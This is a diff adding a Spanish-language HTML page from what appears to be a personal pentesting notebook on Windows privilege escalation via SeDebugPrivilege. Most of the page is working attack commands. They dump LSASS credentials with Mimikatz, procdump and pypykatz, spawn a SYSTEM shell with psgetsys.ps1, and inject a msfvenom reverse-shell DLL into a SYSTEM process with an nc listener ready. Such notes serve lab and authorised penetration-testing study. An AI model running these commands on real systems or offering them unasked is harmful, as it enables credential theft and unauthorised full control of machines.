@@ -1,0 +1,126 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Debug | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="debug">
+          <div class="note-tabbar">
+            <span>Debug</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Escalada de Privilegios/Windows/Privilegios</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">escalada de privilegios / windows / privilegios</p>
+            <h2>Debug</h2>
+
+            <aside class="callout">
+              <p><strong>Debug</strong> Este privilegio permite escalar privilegios de 3 formas diferentes: <code>Volcar Hashes de LSASS</code>: Permite ejecutar Mimikatz con privilegios para volcar hashes <code>Token System</code>: Permite modificar el payload de un proceso que corre como SYSTEM <code>DLL Hijacking</code>: Permite inyectar un payload a un proceso que corre como SYSTEM</p>
+            </aside>
+
+            <aside class="callout warning">
+              <p><code>SeDebugPrivilege</code> permite abrir procesos de alto privilegio y leer o manipular memoria. Es especialmente sensible contra <code>LSASS</code>, pero puede estar bloqueado por EDR, PPL o políticas del sistema.</p>
+            </aside>
+
+            <h2>Volcar Hashes de LSASS</h2>
+
+            <section class="code-card">
+              <h3>Volcar hashes del proceso LSASS directamente</h3>
+              <pre><code>mimikatz.exe # Iniciar Mimikatz
+privilege::debug # Habilita privilegio SeDebugPrivilege
+sekurlsa::logonpasswords # Extrae credenciales</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Extraer lsass.dmp</h3>
+              <pre><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp # Descargar lsass.dmp</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Volcar lsass.dmp</h3>
+              <pre><code># Kali
+pypykatz lsa minidump &lt;lsass.dmp&gt;
+# Windows
+mimikatz.exe # Iniciar Mimikatz
+privilege::debug # Habilita privilegio SeDebugPrivilege
+sekurlsa::minidump lsass.dmp # Carga el dumpeo de la memoria
+sekurlsa::logonpasswords # Extrae credenciales</code></pre>
+            </section>
+
+            <p>Ruta de <code>lsass.dmp</code>: <code>administrador de Tareas</code> -&gt; <code>Details</code> -&gt; <code>lsass.exe</code> -&gt; <code>Create Dump File</code></p>
+
+            <h2>Token System (RCE)</h2>
+
+            <p><a href="https://github.com/decoder-it/psgetsystem">PsGetSystem</a></p>
+
+            <section class="code-card">
+              <h3>PowerShell</h3>
+              <pre><code># Importamos el script
+. .\psgetsys.ps1
+# Buscar PID de un proceso ejecutado por SYSTEM normalmente como servicio
+tasklist /v # Ej. winlogon.exe PID:612
+# Abrir CMD como SYSTEM
+.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(612,&quot;c:\Windows\System32\cmd.exe&quot;, &quot;&quot;)</code></pre>
+            </section>
+
+            <h2>Inyección DLL</h2>
+
+            <p><a href="https://daniel10barredo.github.io/PrivEscAssist_Windows/tools/Invoke-DllInjection.ps1">Invoke-DllInjection.ps1</a></p>
+
+            <section class="code-card">
+              <h3>PowerShell</h3>
+              <pre><code># Importamos el módulo
+Import-Module Invoke-DllInjection.ps1
+# Buscar PID de un proceso ejecutado por SYSTEM normalmente como servicio
+tasklist /v # Ej. lsass PID: 476
+# Inyectamos payload controlado en el proceso
+Invoke-DllInjection -ProcessID &lt;PID&gt; -Dll C:\Users\rev.dll</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Kali</h3>
+              <pre><code># Creamos la rev_shell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;kali_ip&gt; LPORT=443 -f dll -o rev.dll
+# Listener
+rlwrap nc -nlvp 443</code></pre>
+            </section>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>notebook</span>
+              <span>windows</span>
+              <span>privesc</span>
+              <span>escalada_privilegios</span>
+              <span>privilegios</span>
+              <span>debug</span>
+              <span>lsass</span>
+              <span>procesos</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
